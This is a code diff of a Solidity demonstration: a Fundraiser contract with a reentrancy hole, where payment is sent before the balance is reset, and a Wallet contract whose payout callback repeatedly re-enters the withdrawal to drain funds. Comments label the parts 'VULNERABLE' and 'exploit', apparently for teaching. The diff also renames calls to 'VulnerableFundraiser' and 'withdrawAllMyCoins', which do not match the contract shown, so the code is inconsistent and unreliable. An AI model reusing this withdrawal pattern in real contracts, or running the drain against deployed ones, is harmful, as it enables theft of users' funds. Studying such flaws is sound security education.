@@ -3,10 +3,13 @@ pragma solidity ^0.4.24;
 contract Fundraiser {
     mapping(address=>uint) balances;
 
+    // VULNERABLE
     function withdrawCoins(){
         uint withdrawAmount = balances[msg.sender];
         Wallet wallet = Wallet(msg.sender);
         wallet.payout.value(withdrawAmount)();
+
+        // this line is not reached before the next recursion!!
         balances[msg.sender] = 0;
     }
 
@@ -23,13 +26,15 @@ contract Fundraiser {
     }
 }
 
+
+
 contract Wallet {
 
     Fundraiser fundraiser;
-    uint recursion = 20;
+    uint recursion=20;
 
     function Wallet(address fundraiserAddress) {
-        fundraiser = Fundraiser(fundraiserAddress);
+        fundraiser = VulnerableFundraiser(fundraiserAddress);
     }
 
     function contribute(uint amount) {
@@ -37,7 +42,7 @@ contract Wallet {
     }
 
     function withdraw(){
-        fundraiser.withdrawCoins();
+        fundraiser.withdrawAllMyCoins();
     }
 
     function getBalance() constant returns (uint) {
@@ -45,11 +50,10 @@ contract Wallet {
     }
 
     function payout() payable {
-        if(recursion > 0){
+        // exploit
+        if(recursion>0) {
             recursion--;
-            fundraiser.withdrawCoins();
-        }
-
+            fundraiser.withdrawAllMyCoins();
         }
     }
 
